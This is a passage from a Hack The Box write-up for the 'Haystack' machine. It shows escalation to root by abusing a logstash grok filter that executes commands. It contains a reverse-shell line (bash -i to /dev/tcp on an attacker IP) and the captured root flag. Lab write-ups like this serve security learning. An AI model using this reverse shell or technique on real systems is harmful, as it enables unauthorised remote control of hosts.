+</span></span><span style="display:flex;"><span>bash-4.2$ ls -la
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>total 12
+</span></span><span style="display:flex;"><span>drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
+</span></span><span style="display:flex;"><span>-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
+</span></span><span style="display:flex;"><span>-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
+</span></span><span style="display:flex;"><span>-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
+</span></span><span style="display:flex;"><span>bash-4.2$ cat filter.conf
+</span></span><span style="display:flex;"><span>cat filter.conf
+</span></span><span style="display:flex;"><span>filter {
+</span></span><span style="display:flex;"><span>	if [type] == &#34;execute&#34; {
+</span></span><span style="display:flex;"><span>		grok {
+</span></span><span style="display:flex;"><span>			match =&gt; { &#34;message&#34; =&gt; &#34;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&#34; }
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This filter allows us to execute commands with the proper input. By placing our own <code>logstash_x</code> file into the <code>/opt/kibana</code> directory, we should get command execution.</p>
+<p>Our logstash file follows exactly as <code>filter.conf</code> defines. Small note, our IP address has changed due to reconnecting to the Hack The Box VPN the following day.</p>
+<pre tabindex="0"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.15.201/6666  0&gt;&amp;1
+</code></pre><p>After waiting a few seconds, the command to call our reverse shell is executed.</p>
+<p><img src="/posts/images/hack-the-box-haystack-writeup/rooted.png" alt="Rooted">
+<strong>Figure: 5</strong> Rooted</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[root@haystack /]# cat /root/root.txt
+</span></span><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span>3f5f727c38d9f70e1d2ad2ba11059d92
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
+<p>The user flag portion of this box was very CTF like. There&rsquo;s not much chance that in the real world you&rsquo;re going to come across a situation where clues are hidden in a <code>.jpg</code> and then <code>base64</code> encoded credentials are hidden in a database that contains a large amount of arbitrary data. I did learn from this experience though. This was the first time I&rsquo;ve had to find a string hidden in an image, and it was my first experience with Elasticsearch queries.</p>
+<p>The root portion of this box was rather difficult for me with my lack of experience in the ELK stack. It didn&rsquo;t take long to find the local file inclusion vulnerability, but leveraging it to get root really required me to research how <code>logstash</code> and <code>kibana</code> work. All in all I&rsquo;m pleased to have completed the box.</p>
+<h2 id="references">References</h2>
+<ol>
+<li><a href="https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10" target="_blank">https://www.socketloop.com/tutorials/elastic-search-return-all-records-higher-than-default-10</a></li>
+<li><a href="https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file" target="_blank">https://superuser.com/questions/803225/how-to-find-detect-hidden-files-inside-jpeg-file</a></li>
+<li><a href="https://github.com/mpgn/CVE-2018-17246" target="_blank">https://github.com/mpgn/CVE-2018-17246</a></li>
+<li><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" target="_blank">https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/</a></li>
+<li><a href="https://www.anquanke.com/post/id/168291" target="_blank">https://www.anquanke.com/post/id/168291</a></li>
+<li><a href="https://grokdebug.herokuapp.com/" target="_blank">https://grokdebug.herokuapp.com/</a></li>
+</ol>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="http://localhost:1313/posts/hack-the-box-writeup-writeup/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Hack the Box Writeup for Writeup</a>
+        
+	    
+            <div class="next-post">
+                <a href="http://localhost:1313/posts/hack-the-box-jarvis-writeup/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Hack the Box Jarvis Writeup</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+
+        </div>
+    </body>
+</html>
